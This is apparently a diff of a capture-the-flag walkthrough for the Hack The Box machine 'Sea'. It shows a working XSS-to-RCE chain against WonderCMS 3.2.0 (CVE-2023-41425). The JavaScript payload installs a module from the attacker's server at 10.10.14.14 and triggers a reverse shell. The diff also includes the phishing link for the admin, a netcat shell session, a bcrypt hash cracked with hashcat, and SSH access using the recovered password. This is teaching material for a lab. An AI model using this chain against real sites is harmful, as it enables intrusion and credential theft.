@@ -371,39 +371,293 @@ Finished
 
 In `version` we can see the version is `3.2.0` which is vulnerable to CVE-2023-41425.
 
-We'll build a `xss.js`:
+https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE
 
-```js
-var url = "http://sea.htb";
+```
+$ cat xss.js
+
+var url = "http://sea.htb/loginURL";
+if (url.endsWith("/")) {
+    url = url.slice(0, -1);
+}
+var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+var urlObj = new URL(urlWithoutLog);
+var urlWithoutLogBase = urlObj.origin + '/';
 var token = document.querySelectorAll('[name="token"]')[0].value;
-var urlRev =
-  url +
-  "/?installModule=http://10.10.14.14:8000/shelly.zip.zip&directoryName=violet&type=themes&token=" +
-  token;
+var urlRev = urlWithoutLogBase + "/?installModule=http://10.10.14.14:8000/main.zip&directoryName=violet&type=themes&token=" + token;
 var xhr3 = new XMLHttpRequest();
 xhr3.withCredentials = true;
 xhr3.open("GET", urlRev);
 xhr3.send();
-xhr3.onload = function () {
-  if (xhr3.status == 200) {
-    var xhr4 = new XMLHttpRequest();
-    xhr4.withCredentials = true;
-    xhr4.open("GET", url + "/themes/shelly/revo.php");
-    xhr4.send();
-    xhr4.onload = function () {
-      if (xhr4.status == 200) {
-        var xhr5 = new XMLHttpRequest();
-        xhr5.withCredentials = true;
-        xhr5.open("GET", url + "/themes/shelly/revo.php");
-        xhr5.send();
-      }
-    };
-  }
+xhr3.onload = function() {
+    if (xhr3.status == 200) {
+        var xhr4 = new XMLHttpRequest();
+        xhr4.withCredentials = true;
+        xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");
+        xhr4.send();
+        xhr4.onload = function() {
+            if (xhr4.status == 200) {
+                var ip = "10.10.14.14";
+                var port = "4001";
+                var xhr5 = new XMLHttpRequest();
+                xhr5.withCredentials = true;
+                xhr5.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
+                xhr5.send();
+            }
+        };
+    }
 };
 ```
 
-We'll place a PHP reverse shell in `shelly/revo.php`, then ZIP it up to a archive in our web server directory.
+```
+$ ./exploit.py -u http://sea.htb/loginURL -i 10.10.14.14 -p 4001 -r http://10.10.14.14:8000/main.zip
+
+
+
+================================================================
+        # Autor      : Insomnia (Jacob S.)
+        # IG         : insomnia.py
+        # X          : @insomniadev_
+        # Github     : https://github.com/insomnia-jacob
+================================================================
+
+[+]The zip file will be downloaded from the host:    http://10.10.14.14:8000/main.zip
+
+[+] File created:  xss.js
+
+[+] Set up nc to listen on your terminal for the reverse shell
+        Use:
+                   nc -nvlp 4001
+
+[+] Send the below link to admin:
+
+         http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.14:8000/xss.js"></script><form+action="
+
+Starting HTTP server with Python3, waiting for the XSS request
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.28 - - [17/Dec/2024 09:45:54] "GET /xss.js HTTP/1.1" 200 -
+10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
+10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
+10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
+10.10.11.28 - - [17/Dec/2024 09:46:04] "GET /main.zip HTTP/1.1" 200 -
+```
 
 ```
-http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.14:8000/xss.js"></script><form+action="
+$ nc -lvnp 4001
+listening on [any] 4001 ...
+connect to [10.10.14.14] from (UNKNOWN) [10.10.11.28] 48526
+Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 08:46:20 up 10 min,  0 users,  load average: 0.06, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+```
+www-data@sea:/$ cd /var/www
+
+www-data@sea:/var/www$ ls
+
+html  sea
+
+www-data@sea:/var/www$ cd sea
+
+www-data@sea:/var/www/sea$ ls -l
+total 116
+-rwxr-xr-x 1 www-data www-data  3521 Feb 21  2024 contact.php
+drwxr-xr-x 3 www-data www-data  4096 Feb 22  2024 data
+-rwxr-xr-x 1 www-data www-data 96604 Feb 22  2024 index.php
+drwxrwxr-x 2 www-data www-data  4096 Dec 17 08:53 messages
+drwxr-xr-x 2 www-data www-data  4096 Feb 21  2024 plugins
+drwxr-xr-x 4 www-data www-data  4096 Dec 17 08:46 themes
+
+www-data@sea:/var/www/sea$ cd data
+
+www-data@sea:/var/www/sea/data$ ls
+cache.json  database.js  files
+
+www-data@sea:/var/www/sea/data$ cat database.js
+{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "defaultPage": "home",
+        "login": "loginURL",
+        "forceLogout": false,
+        "forceHttps": false,
+        "saveChangesPopup": false,
+        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
+        "lastLogins": {
+            "2024\/12\/17 08:52:34": "127.0.0.1",
+            "2024\/12\/17 08:46:04": "127.0.0.1",
+            "2024\/07\/31 15:17:10": "127.0.0.1",
+            "2024\/07\/31 15:15:10": "127.0.0.1",
+            "2024\/07\/31 15:14:10": "127.0.0.1"
+        },
+        "lastModulesSync": "2024\/12\/17",
+
+        .......
+    }
+}
+
+```
+
+```
+$ hashcat -m 3200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-skylake-avx512-AMD Ryzen 7 7700X 8-Core Processor, 2858/5780 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
+Time.Started.....: Tue Dec 17 10:00:31 2024 (28 secs)
+Time.Estimated...: Tue Dec 17 10:00:59 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      110 H/s (4.52ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3072/14344384 (0.02%)
+Rejected.........: 0/3072 (0.00%)
+Restore.Point....: 3056/14344384 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: 753159 -> dangerous
+
+Started: Tue Dec 17 10:00:28 2024
+Stopped: Tue Dec 17 10:01:01 2024
+```
+
+The hash corresponds to a password of `mychemicalromance`
+
+```
+www-data@sea:/home$ ls
+ls
+amay  geo
+www-data@sea:/home$ ls geo
+ls geo
+ls: cannot open directory 'geo': Permission denied
+www-data@sea:/home$ ls amay
+ls amay
+user.txt
+www-data@sea:/home$
+```
+
+User flag belongs to `amay`
+
+```
+$ ssh amay@sea.htb
+The authenticity of host 'sea.htb (10.10.11.28)' can't be established.
+ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
+amay@sea.htb's password:
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 17 Dec 2024 09:02:39 AM UTC
+
+  System load:  1.38              Processes:             255
+  Usage of /:   63.3% of 6.51GB   Users logged in:       0
+  Memory usage: 10%               IPv4 address for eth0: 10.10.11.28
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Aug  5 07:16:49 2024 from 10.10.14.40
+amay@sea:~$
+```
+
+```
+amay@sea:~$ cat user.txt
+cc2f414a81b74966e**********
+```
+
+```
+amay@sea:~$ netstat -tnp
+Active Internet connections (w/o servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:8080          127.0.0.1:48338         TIME_WAIT   -
+tcp        1      0 127.0.0.1:80            127.0.0.1:44812         CLOSE_WAIT  -
+tcp        0      0 10.10.11.28:51034       10.10.14.14:4001        ESTABLISHED -
+tcp        0      0 127.0.0.1:50473         127.0.0.1:43468         ESTABLISHED -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45196         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45374         TIME_WAIT   -
+tcp        0      0 127.0.0.1:80            127.0.0.1:36392         ESTABLISHED -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45346         TIME_WAIT   -
+tcp        0      0 10.10.11.28:48526       10.10.14.14:4001        CLOSE_WAIT  -
+tcp        0      1 10.10.11.28:54276       8.8.8.8:53              SYN_SENT    -
+tcp        0    216 10.10.11.28:22          10.10.14.14:34580       ESTABLISHED -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45362         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:33366         TIME_WAIT   -
+tcp        0      0 127.0.0.1:43468         127.0.0.1:50473         ESTABLISHED -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:48352         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:33364         TIME_WAIT   -
+tcp        1      0 127.0.0.1:55270         127.0.0.1:80            CLOSE_WAIT  -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:33168         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:39692         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:39678         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:39694         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45210         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45354         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:45200         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:48368         TIME_WAIT   -
+tcp        0      0 127.0.0.1:36392         127.0.0.1:80            ESTABLISHED -
+tcp        1      0 127.0.0.1:49100         127.0.0.1:80            CLOSE_WAIT  -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:33362         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:33174         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:33156         TIME_WAIT   -
+tcp        0      0 127.0.0.1:8080          127.0.0.1:48362         TIME_WAIT   -
+```
+
+```
+$ ssh -L 8888:localhost:8080 amay@sea.htb
 ```
